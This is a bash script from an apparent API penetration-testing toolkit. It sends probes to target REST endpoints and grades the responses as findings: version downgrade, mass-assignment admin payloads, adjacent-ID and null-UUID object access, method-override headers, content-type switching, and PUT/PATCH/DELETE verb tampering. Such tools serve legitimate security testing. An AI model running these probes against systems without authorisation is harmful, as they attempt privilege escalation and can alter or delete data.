#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ap_rest_abuse.sh — REST API Abuse Testing                   ║
# ║  Version downgrade · mass assignment · BOLA · method         ║
# ║  override · content-type switching · verb tampering          ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ap_rest_abuse.sh"
SCRIPT_DESC="REST API Abuse Testing"
MAX_ENDPOINTS=100

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test REST API endpoints for common abuse patterns: version"
    echo "  downgrade, mass assignment, BOLA/IDOR, method override headers,"
    echo "  content-type switching, and verb tampering."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with API URLs (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "4" "$SCRIPT_DESC"

# ── Locate API endpoints ─────────────────────────────────────
ENDPOINTS_FILE=""
if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    ENDPOINTS_FILE="$URLS_FILE"
elif [ -f "${OUT_DIR}/ac_api_findings.txt" ]; then
    ENDPOINTS_FILE="${OUT_DIR}/ac_api_findings.txt"
elif [ -f "${OUT_DIR}/ap_discovered_endpoints.txt" ]; then
    ENDPOINTS_FILE="${OUT_DIR}/ap_discovered_endpoints.txt"
else
    # Build from domain if provided
    if [ -z "${DOMAIN:-}" ] && [ -z "${DOMAINS_FILE:-}" ]; then
        err "No API endpoints found. Provide --urls, --domain, or run ac_api_discovery.sh first."
        script_usage
        exit 1
    fi
fi

# ── Build URL list ────────────────────────────────────────────
URL_LIST=$(mktemp)
trap 'rm -f "$URL_LIST"' EXIT

if [ -n "$ENDPOINTS_FILE" ] && [ -f "$ENDPOINTS_FILE" ]; then
    # Extract URLs from findings format: "200 [123B/10w] https://..."
    grep -oP 'https?://[^\s]+' "$ENDPOINTS_FILE" 2>/dev/null | sort -u >> "$URL_LIST"
fi

# Add domain-based common API paths
build_api_urls() {
    local base="$1"
    local api_paths=("/api" "/api/v1" "/api/v2" "/api/v3" "/rest" "/rest/v1")
    for p in "${api_paths[@]}"; do
        echo "${base}${p}" >> "$URL_LIST"
    done
}

if [ -n "${DOMAINS_FILE:-}" ] && [ -f "$DOMAINS_FILE" ]; then
    while IFS= read -r d; do
        d=$(echo "$d" | sed 's/\*\.//')
        [ -n "$d" ] && build_api_urls "https://${d}"
    done < "$DOMAINS_FILE"
elif [ -n "${DOMAIN:-}" ]; then
    build_api_urls "https://${DOMAIN}"
fi

sort -u -o "$URL_LIST" "$URL_LIST"
total_urls=$(count_lines "$URL_LIST")

if [ "$total_urls" -eq 0 ]; then
    err "No API URLs to test"
    exit 1
fi

info "Loaded ${total_urls} API URL(s) for testing"
if [ "$total_urls" -gt "$MAX_ENDPOINTS" ]; then
    warn "Capping to ${MAX_ENDPOINTS} endpoints (from ${total_urls})"
fi

# ── Output file ──────────────────────────────────────────────
> "${OUT_DIR}/ap_rest_abuse_findings.txt"

# ── Counters ─────────────────────────────────────────────────
HIGH_COUNT=0
MEDIUM_COUNT=0
LOW_COUNT=0
processed=0

record_finding() {
    local severity="$1" url="$2" test_name="$3" detail="$4"
    echo "[${severity}] ${test_name} | ${url} | ${detail}" >> "${OUT_DIR}/ap_rest_abuse_findings.txt"
    case "$severity" in
        HIGH|CRITICAL) ((HIGH_COUNT++)) || true; warn "[${severity}] ${test_name}: ${url}" ;;
        MEDIUM)        ((MEDIUM_COUNT++)) || true; log "[MEDIUM] ${test_name}: ${url}" ;;
        *)             ((LOW_COUNT++)) || true ;;
    esac
}

# ══════════════════════════════════════════════════════════════
# Process each URL
# ══════════════════════════════════════════════════════════════
while IFS= read -r url; do
    [ -z "$url" ] && continue
    ((processed++)) || true
    [ "$processed" -gt "$MAX_ENDPOINTS" ] && break

    info "[${processed}/${total_urls}] Testing: ${url}"

    # ── GET baseline ─────────────────────────────────────────
    baseline_full=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
        -D- -w "\n%{http_code}" "$url" 2>/dev/null || echo "000")
    baseline_code=$(echo "$baseline_full" | tail -1)
    baseline_headers=$(echo "$baseline_full" | sed '$d')
    baseline_size=$(echo "$baseline_headers" | wc -c)

    if [ "$baseline_code" = "000" ]; then
        info "  Unreachable, skipping"
        continue
    fi

    # ══════════════════════════════════════════════════════════
    # Test 1: API Version Downgrade
    # ══════════════════════════════════════════════════════════
    info "  [1/6] Version downgrade..."

    # Detect version pattern in URL and try downgrading
    if echo "$url" | grep -qP '/v[2-9]\d*/'; then
        current_ver=$(echo "$url" | grep -oP '/v(\d+)/' | grep -oP '\d+')
        if [ -n "$current_ver" ] && [ "$current_ver" -gt 1 ]; then
            # Try each lower version
            for ((v=current_ver-1; v>=1; v--)); do
                downgraded_url=$(echo "$url" | sed "s|/v${current_ver}/|/v${v}/|")
                down_result=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                    -o /dev/null -w "%{http_code}:%{size_download}" "$downgraded_url" 2>/dev/null || echo "000:0")
                down_status="${down_result%%:*}"
                down_size="${down_result##*:}"

                if [[ "$down_status" =~ ^(200|201)$ ]] && [ "${down_size:-0}" -gt 50 ]; then
                    # Compare response to see if it leaks more data
                    down_body=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                        "$downgraded_url" 2>/dev/null || echo "")
                    current_body=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                        "$url" 2>/dev/null || echo "")

                    down_body_size=${#down_body}
                    current_body_size=${#current_body}

                    if [ "$down_body_size" -gt "$current_body_size" ]; then
                        record_finding "HIGH" "$downgraded_url" "API Version Downgrade" \
                            "v${v} returns ${down_body_size}B vs v${current_ver} ${current_body_size}B — older version may expose more data"
                    else
                        record_finding "MEDIUM" "$downgraded_url" "API Version Downgrade" \
                            "v${v} is accessible (HTTP ${down_status}, ${down_size}B) — deprecated version still active"
                    fi
                fi
            done
        fi
    fi

    # Also try adding /v1/ if no version in URL
    if ! echo "$url" | grep -qP '/v\d+/'; then
        for ver in "v1" "v2" "v3"; do
            versioned_url="${url}/${ver}"
            ver_status=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -o /dev/null -w "%{http_code}" "$versioned_url" 2>/dev/null || echo "000")
            if [[ "$ver_status" =~ ^(200|201|301|302)$ ]]; then
                record_finding "LOW" "$versioned_url" "API Version Discovered" \
                    "API version endpoint active: ${versioned_url} (HTTP ${ver_status})"
            fi
        done
    fi

    # ══════════════════════════════════════════════════════════
    # Test 2: Mass Assignment
    # ══════════════════════════════════════════════════════════
    info "  [2/6] Mass assignment probing..."

    mass_assign_params='{"admin":true,"role":"admin","is_admin":1,"isAdmin":true,"user_type":"admin","privilege":"admin","level":0,"verified":true,"active":true,"approved":true}'

    for method in POST PUT PATCH; do
        ma_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
            -X "$method" -H "Content-Type: application/json" \
            -d "$mass_assign_params" \
            -w "\n%{http_code}" "$url" 2>/dev/null || echo "000")
        ma_code=$(echo "$ma_resp" | tail -1)
        ma_body=$(echo "$ma_resp" | sed '$d')

        # Skip 404/405 — endpoint doesn't accept this method
        [[ "$ma_code" =~ ^(404|405|000)$ ]] && continue

        if [[ "$ma_code" =~ ^(200|201)$ ]]; then
            # Check if response reflects our injected params
            if echo "$ma_body" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    resp_str = json.dumps(d).lower()
    # Check if admin/role fields are reflected in response
    if any(kw in resp_str for kw in ['\"admin\":true', '\"admin\": true', '\"role\":\"admin\"', '\"is_admin\":1', '\"isadmin\":true']):
        sys.exit(0)
except: pass
sys.exit(1)
" 2>/dev/null; then
                record_finding "HIGH" "$url" "Mass Assignment" \
                    "Injected admin params reflected in ${method} response (HTTP ${ma_code}) — privilege escalation risk"
            else
                record_finding "MEDIUM" "$url" "Mass Assignment Accepted" \
                    "${method} with admin params accepted (HTTP ${ma_code}) — verify if fields are processed"
            fi
        elif [[ "$ma_code" =~ ^(401|403)$ ]]; then
            # Auth required — the endpoint accepts the method, might be exploitable with valid session
            record_finding "LOW" "$url" "Mass Assignment (Auth Required)" \
                "${method} returns ${ma_code} — endpoint accepts method, test with valid session"
        fi
    done

    # ══════════════════════════════════════════════════════════
    # Test 3: BOLA/IDOR — Object ID manipulation
    # ══════════════════════════════════════════════════════════
    info "  [3/6] BOLA/IDOR probing..."

    # Check if URL contains numeric IDs
    if echo "$url" | grep -qP '/\d+(/|$)'; then
        original_id=$(echo "$url" | grep -oP '/(\d+)(/|$)' | head -1 | tr -d '/')

        if [ -n "$original_id" ]; then
            # Try adjacent IDs
            for offset in 1 -1 2 -2 0; do
                test_id=$(( original_id + offset ))
                [ "$test_id" -lt 0 ] && continue
                [ "$test_id" -eq "$original_id" ] && continue

                bola_url=$(echo "$url" | sed "s|/${original_id}|/${test_id}|")
                bola_result=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                    -o /dev/null -w "%{http_code}:%{size_download}" "$bola_url" 2>/dev/null || echo "000:0")
                bola_status="${bola_result%%:*}"
                bola_size="${bola_result##*:}"

                if [[ "$bola_status" =~ ^(200|201)$ ]] && [ "${bola_size:-0}" -gt 50 ]; then
                    record_finding "HIGH" "$bola_url" "BOLA/IDOR" \
                        "Adjacent ID ${test_id} accessible (HTTP ${bola_status}, ${bola_size}B) — original ID was ${original_id}"
                    break  # One finding is enough
                fi
            done
        fi
    fi

    # Check for UUID-based endpoints — try null UUID
    if echo "$url" | grep -qP '/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'; then
        null_uuid="00000000-0000-0000-0000-000000000000"
        uuid_url=$(echo "$url" | sed -E "s|/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|/${null_uuid}|")
        uuid_result=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
            -o /dev/null -w "%{http_code}:%{size_download}" "$uuid_url" 2>/dev/null || echo "000:0")
        uuid_status="${uuid_result%%:*}"
        uuid_size="${uuid_result##*:}"

        if [[ "$uuid_status" =~ ^(200|201)$ ]] && [ "${uuid_size:-0}" -gt 50 ]; then
            record_finding "MEDIUM" "$uuid_url" "BOLA/IDOR (Null UUID)" \
                "Null UUID returns data (HTTP ${uuid_status}, ${uuid_size}B)"
        fi
    fi

    # ══════════════════════════════════════════════════════════
    # Test 4: HTTP Method Override Headers
    # ══════════════════════════════════════════════════════════
    info "  [4/6] Method override headers..."

    override_headers=(
        "X-HTTP-Method-Override"
        "X-Method-Override"
        "X-HTTP-Method"
        "X-Original-Method"
        "_method"
    )

    for override in "${override_headers[@]}"; do
        for target_method in PUT DELETE PATCH; do
            override_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -H "${override}: ${target_method}" \
                -o /dev/null -w "%{http_code}:%{size_download}" "$url" 2>/dev/null || echo "000:0")
            override_status="${override_resp%%:*}"
            override_size="${override_resp##*:}"

            # Compare with plain POST
            post_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -o /dev/null -w "%{http_code}:%{size_download}" "$url" 2>/dev/null || echo "000:0")
            post_status="${post_resp%%:*}"
            post_size="${post_resp##*:}"

            if [ "$override_status" != "$post_status" ] && [[ "$override_status" =~ ^(200|201|204)$ ]]; then
                record_finding "MEDIUM" "$url" "Method Override" \
                    "Header '${override}: ${target_method}' changes behavior: POST=${post_status} vs override=${override_status}"
            fi
        done
    done

    # Also test _method parameter in body
    for target_method in PUT DELETE PATCH; do
        param_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
            -X POST -H "Content-Type: application/x-www-form-urlencoded" \
            -d "_method=${target_method}" \
            -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")

        post_only=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
            -X POST -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")

        if [ "$param_resp" != "$post_only" ] && [[ "$param_resp" =~ ^(200|201|204)$ ]]; then
            record_finding "MEDIUM" "$url" "Method Override (_method param)" \
                "Body param '_method=${target_method}' changes behavior: POST=${post_only} vs override=${param_resp}"
        fi
    done

    # ══════════════════════════════════════════════════════════
    # Test 5: Content-Type Switching
    # ══════════════════════════════════════════════════════════
    info "  [5/6] Content-type switching..."

    # Test JSON endpoint with XML
    json_body='{"test":"probe"}'
    xml_body='<?xml version="1.0" encoding="UTF-8"?><test>probe</test>'
    form_body='test=probe'

    json_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
        -X POST -H "Content-Type: application/json" \
        -d "$json_body" -w "\n%{http_code}" "$url" 2>/dev/null || echo "000")
    json_code=$(echo "$json_resp" | tail -1)

    # Try XML content-type
    xml_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
        -X POST -H "Content-Type: application/xml" \
        -d "$xml_body" -w "\n%{http_code}" "$url" 2>/dev/null || echo "000")
    xml_code=$(echo "$xml_resp" | tail -1)
    xml_body_resp=$(echo "$xml_resp" | sed '$d')

    if [[ "$xml_code" =~ ^(200|201)$ ]] && [ "$xml_code" != "$json_code" ]; then
        # Check for XXE indicators in XML response
        if echo "$xml_body_resp" | grep -qiE '(xml|parsed|entity|DOCTYPE)'; then
            record_finding "HIGH" "$url" "Content-Type Switch (XML)" \
                "Endpoint processes XML input (HTTP ${xml_code}) — potential XXE vector"
        else
            record_finding "MEDIUM" "$url" "Content-Type Switch (XML)" \
                "Endpoint accepts XML content-type (HTTP ${xml_code} vs JSON ${json_code})"
        fi
    fi

    # Try form-data when JSON is expected
    form_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
        -X POST -H "Content-Type: application/x-www-form-urlencoded" \
        -d "$form_body" -w "\n%{http_code}" "$url" 2>/dev/null || echo "000")
    form_code=$(echo "$form_resp" | tail -1)

    if [[ "$form_code" =~ ^(200|201)$ ]] && [ "$form_code" != "$json_code" ]; then
        record_finding "LOW" "$url" "Content-Type Switch (Form)" \
            "Endpoint accepts form data (HTTP ${form_code} vs JSON ${json_code})"
    fi

    # ══════════════════════════════════════════════════════════
    # Test 6: Verb Tampering — PUT/PATCH/DELETE on GET endpoints
    # ══════════════════════════════════════════════════════════
    info "  [6/6] Verb tampering..."

    for method in PUT PATCH DELETE; do
        verb_result=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
            -X "$method" -H "Content-Type: application/json" \
            -d '{}' \
            -o /dev/null -w "%{http_code}:%{size_download}" "$url" 2>/dev/null || echo "000:0")
        verb_status="${verb_result%%:*}"
        verb_size="${verb_result##*:}"

        # Compare with baseline
        if [[ "$verb_status" =~ ^(200|201|204)$ ]] && [ "$verb_status" != "$baseline_code" ]; then
            # Check if it's a sensitive endpoint
            is_sensitive=false
            if echo "$url" | grep -qiP '(admin|config|user|account|settings|delete|remove|update)'; then
                is_sensitive=true
            fi

            if $is_sensitive; then
                record_finding "HIGH" "$url" "Verb Tampering" \
                    "${method} accepted on sensitive endpoint (HTTP ${verb_status}, ${verb_size}B vs GET ${baseline_code})"
            else
                record_finding "MEDIUM" "$url" "Verb Tampering" \
                    "${method} returns different response (HTTP ${verb_status} vs GET ${baseline_code})"
            fi
        fi
    done

done < "$URL_LIST"

# ══════════════════════════════════════════════════════════════
# Summary
# ══════════════════════════════════════════════════════════════
total_findings=$(count_lines "${OUT_DIR}/ap_rest_abuse_findings.txt")

echo ""
log "REST API abuse testing complete: ${processed} endpoint(s) tested"
log "  HIGH/CRITICAL: ${HIGH_COUNT}"
log "  MEDIUM:        ${MEDIUM_COUNT}"
log "  LOW/INFO:      ${LOW_COUNT}"
log "  Total:         ${total_findings} findings → ${OUT_DIR}/ap_rest_abuse_findings.txt"

if [ "$HIGH_COUNT" -gt 0 ]; then
    echo ""
    warn "HIGH/CRITICAL findings:"
    grep -E '^\[(HIGH|CRITICAL)\]' "${OUT_DIR}/ap_rest_abuse_findings.txt" 2>/dev/null | while IFS= read -r line; do
        warn "  ${line}"
    done
fi
